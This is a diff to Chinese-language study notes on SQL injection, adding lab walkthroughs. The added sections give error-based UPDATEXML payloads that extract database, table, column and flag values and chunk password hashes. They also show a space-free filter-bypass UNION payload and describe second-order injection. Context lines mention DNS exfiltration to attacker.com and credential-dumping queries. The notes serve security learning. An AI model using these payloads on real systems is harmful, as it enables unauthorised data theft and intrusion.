@@ -367,9 +367,116 @@ cn' UNION select 1, username, password, 4 from dev.credentials-- -
 
 我们现在可以利用此漏洞，并根据错误消息进一步了解数据库结构。
 
-案例1
+### 案例1
 
+该页面存在报错注入的可能,在id字段加入单引号后出现提示错误的信息
 
+![1772900555301](images/sqli/1772900555301.png)
+
+在使用 `'-- - 后还是提示有错误`
+
+![1772900730188](images/sqli/1772900730188.png)
+
+这需要引起怀疑的是,当前的注入点的字段是数字型的还是字符型的,例如原始查询为
+
+```sql
+SELECT * FROM art WHERE id=32
+```
+
+如果我门在这里闭合单引号,这将导致语法错误类似
+
+```sql
+SELECT * FROM art WHERE id=32' OR 1=1-- -
+```
+
+当不封闭单引号时,页面显示正常.说明注入点是数值型的
+
+![1772901132229](images/sqli/1772901132229.png)
+
+### updatexml()
+
+我们可以利用updatexml()函数,UPDATEXML() 本来是 MySQL 提供的一个用来修改 XML 文档的正常函数。
+它的标准语法是：UPDATEXML(XML文档, XPath路径, 替换成什么新内容),MySQL 规定，XPath路径这个参数必须是合法的 XPath 格式（比如 /root/user/name）。如果它不合法，MySQL 就会当场崩溃，并且为了方便开发者调试，它会把那个“不合法的字符串”原封不动地通过错误信息打印在屏幕上！
+
+```sql
+AND UPDATEXML(1, CONCAT(CHAR(126), version(), CHAR(126)), 1)
+
+```
+
+> MySQL 官方对 UPDATEXML 和 EXTRACTVALUE 这两个报错函数的输出长度做了极其严格的限制：报错信息最多只能显示 32 个字符！
+>
+> 假设你脱取出来的密码哈希值有 32 位（比如 MD5），再加上前后的两个 ~，已经超出了 32 个字符。MySQL 会无情地把后面的内容直接截断扔掉
+
+遇到长数据，我们必须用 SUBSTRING() 函数把它切开，分批次提取。
+
+第一次查前 30 个字符：
+
+```sql
+AND UPDATEXML(1, CONCAT(CHAR(126), SUBSTRING((SELECT password FROM users), 1, 30), CHAR(126)), 1)
+```
+
+第二次查剩下的字符：
+
+```sql
+AND UPDATEXML(1, CONCAT(CHAR(126), SUBSTRING((SELECT password FROM users), 31, 30), CHAR(126)), 1)
+```
+
+回到我们的问题,尝试使用UPDATEXML函数获取数据库名
+
+```
+AND updatexml(1,concat(0x7e,(select database()),0x7e),1)--- 
+```
+
+![1772902124714](images/sqli/1772902124714.png)
+
+接下来获取数据库中有用的的信息
+
+### 获取所有数据库名
+
+为了避免被截断数据,选择使用limit限制数据的输出,这样很保险
+
+```sql
+AND updatexml(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), 0x7e), 1)
+```
+
+![1772902601316](images/sqli/1772902601316.png)
+
+如果使用如下的注入方式,将遗漏数据:
+
+```sql
+AND updatexml(1, concat(0x7e, (SELECT GROUP_CONCAT(schema_name)FROM information_schema.schemata ), 0x7e), 1)
+```
+
+![1772902733577](images/sqli/1772902733577.png)
+
+经过尝试,发现只有一个不是dbms自带的数据库,如 `cms`
+
+### 获取有用的表
+
+```pgsql
+AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables where table_schema = 'cms' limit 0,1),0x7e),1)
+```
+
+![1772903198964](images/sqli/1772903198964.png)
+
+经过不断的查询,获得数据库中的表 `cms_flag`
+
+### 获取字段名和数据
+
+```sql
+AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns where table_name = 'cms_flag' limit 0,1),0x7e),1)
+
+```
+
+![1772903468796](images/sqli/1772903468796.png)
+
+最后获取该字段的数据,完成
+
+```sql
+AND updatexml(1,concat(0x7e,(SELECT flag FROM cms_flag limit 0,1),0x7e),1)
+```
+
+> 如果能使用union联合注入,还是优先推荐使用联合注入,报错注入 除了输出长度的限制外,基本上sql语句的查询消息是不会让前端能看到的
 
 ## 身份验证绕过
 
@@ -679,7 +786,6 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 
 > 触发条件错误的方法有很多种，不同的技术在不同的数据库类型上效果也各不相同。更多详情，请参阅 SQL 注入速查表 。[文当](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-
 如下案例:
 
 包含一个盲注 SQL 注入漏洞。该应用程序使用跟踪 cookie 进行分析，并执行包含所提交 cookie 值的 SQL 查询。SQL 查询结果不会返回，应用程序也不会根据查询是否返回任何行而做出不同的响应。如果 SQL 查询导致错误，则应用程序会返回自定义错误消息。数据库中有一个名为 users 独立表，其中包含 username 和 password 两列。你需要利用盲注 SQL 注入漏洞来获取 administrator 用户的密码。要完成实验，请以 administrator 用户身份登录。
@@ -758,7 +864,6 @@ substr(password,1,1)='a'
 
 该有效载荷应该产生 5 秒的延迟，确认 UNION 语句成功执行并且有两列。现在，您可以重复基于布尔值的 SQL 注入中的枚举过程 ，只需将 SLEEP() 方法添加到 UNION SELECT 语句中即可。
 
-
 # 带外注入 (Out-of-band SQLi)
 
 应用程序可能会执行与之前示例相同的 SQL 查询，但以异步方式执行。应用程序在原始线程中继续处理用户的请求，并使用另一个线程通过跟踪 cookie 执行 SQL 查询。该查询仍然容易受到 SQL 注入攻击，但目前为止描述的任何技术都无法奏效。应用程序的响应不依赖于查询是否返回任何数据、是否发生数据库错误或查询执行所花费的时间。
@@ -775,11 +880,9 @@ substr(password,1,1)='a'
 
 无视网络限制：攻击者通常会将 SQL 注入的查询结果作为子域名，触发数据库向攻击者控制的恶意域名发起 DNS 解析请求（例如：[敏感数据].attacker.com）。即使在攻击者与目标之间的直接连接受限的复杂网络环境中，这种机制依然能保证数据稳定、隐蔽地被窃取。
 
-
 ![1772794398719](images/sqli/1772794398719.png)![1772797099353](images/sqli/1772797099353.png)
 
 带外攻击（OAST）技术是检测和利用盲注 SQL 注入的有效方法，因为它成功率高，并且能够直接在带外通道中窃取数据。因此，即使在其他盲注攻击技术有效的情况下，OAST 技术通常也是更优的选择。
-
 
 # 读取和写入文件
 
@@ -948,6 +1051,8 @@ id 命令的输出确认我们拥有代码执行权限，并且正在以 www-dat
 
 # 过滤绕过
 
+具体参见[文档](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#generic-waf-bypass)
+
 1. #### 字符编码
 
 
@@ -970,7 +1075,7 @@ id 命令的输出确认我们拥有代码执行权限，并且正在以 www-dat
 
    - **用注释替换空格** ：一种常见的方法是使用 SQL 注释 ( `/**/` ) 替换空格。例如，攻击者可以使用 `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'` 代替 `SELECT * FROM users WHERE name = 'admin'` 。SQL 注释可以替换查询中的空格，从而使有效载荷能够绕过删除或阻止空格的过滤器。
    - **制表符或换行符** ：另一种方法是使用制表符 ( `\t` ) 或换行符 ( `\n` ) 代替空格。某些过滤器可能允许这些字符，从而使攻击者能够构建类似 `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'` 的查询。此技术可以绕过专门查找空格的过滤器。
-   - **替代字符** ：一种有效的方法是使用替代 URL 编码字符来表示不同类型的空格，例如 `%09` （水平制表符）、 `%0A` （换行符）、 `%0C` （换页符）、 `%0D` （回车符）和 `%A0` （不间断空格）。这些字符可以替换有效载荷中的空格。
+   - **替代字符** ：一种有效的方法是使用替代 URL 编码字符来表示不同类型的空格，例如 `%09` （水平制表符）、 `%0A` （换行符）、 `%0C` （换页符）、 `%0D` （回车符）和 `%A0` （不间断空格）,`%0B` (垂直制表符)。这些字符可以替换有效载荷中的空格。
 4. #### 一些技巧罢了
 
    | **Scenario 设想**                                                           | **Description 描述**                                         | **Example 例子**                                                                                        |
@@ -981,6 +1086,56 @@ id 命令的输出确认我们拥有代码执行权限，并且正在以 www-dat
    | **禁止使用 UNION、SELECT 等常用关键字**                                     | 使用等效表示形式（例如十六进制或 Unicode 编码）来绕过过滤器。      | SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)                                           |
    | **禁止使用 OR、AND、SELECT、UNION 等特定关键字**                            | .使用混淆技术通过将字符与字符串函数或注释相结合来伪装 SQL 关键字。 | SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users |
    |                                                                                   |                                                                    |                                                                                                               |
+
+## 案例1
+
+页面存在注入点
+
+![1772904636922](images/sqli/1772904636922.png)
+
+该页面有很强的过滤,空格的各种编码也完全过滤了,当使用
+
+```sql
+'AND'1'='1
+```
+
+![1772907199896](images/sqli/1772907199896.png)
+
+使用
+
+```sql
+'AND'1'='2
+```
+
+![1772907282073](images/sqli/1772907282073.png)
+
+AND 居然奏效了,为什么他两边不需要空格也可以?
+
+> 在 MySQL 中，单引号 '、双引号 "、括号 () 以及算术符号（如 =、+、-）本身就自带“天然分隔符”的属性
+> 如果你写成数字的比较：1AND1=1
+> 数据库会怎么读？它读完 1，紧接着读到了 A，没有遇到任何引号或括号，它就会把 1AND1 连在一起，当成一个奇奇怪怪的列名或者未知函数去解析，最后直接报错。
+> 这个时候，你就必须加空格：1 AND 1=1，用空格强行告诉数据库“它们是分开的”
+> 当你加上单引号变成 '1'AND'1' 时，由于单引号自带“一刀切”的隔离效果，数据库绝不会把 '1' 和 AND 混为一谈。此时，空格加不加都一样，数据库都能完美识别出三个独立的词：'1'、AND、'1'。
+
+事实上,我这这里卡住了,不能使用空格意味着 不能使用 `order by` 猜测列数,b不能使用 `union select` 联合查询 ,这如何是好
+在 `UNION SELECT` 下,可以这样使用 ,因为这个程序在末尾会添加'),而且是程序最后的语言,所以这里没有使用注释,而是巧妙的利用了他
+
+```sql
+UNION(SELECT(1),2,3,'4
+```
+
+![1772911932262](images/sqli/1772911932262.png)
+
+# 二阶注入Second-Order SQL Injection
+
+指用户提供的数据被应用程序存储，随后以不安全的方式嵌入到 SQL 查询中。与一阶 SQL 注入（攻击载荷立即执行）不同，二阶 SQL 注入涉及两个步骤。首先，攻击者提交恶意输入并存储在数据库中。之后，当应用程序检索并处理这些存储的数据时，恶意输入才会被执行。
+
+假设有一个允许用户更新个人资料的 Web 应用程序。该应用程序会将用户输入的信息存储在数据库中。之后，当用户查看个人资料时，应用程序会检索这些数据并将其整合到 SQL 查询中，但并未进行适当的清理。攻击者可以利用这一点，在用户更新个人资料期间提交恶意代码，该代码会在用户查看个人资料时执行。
+
+
+
+
+
 
 
 # 备忘录
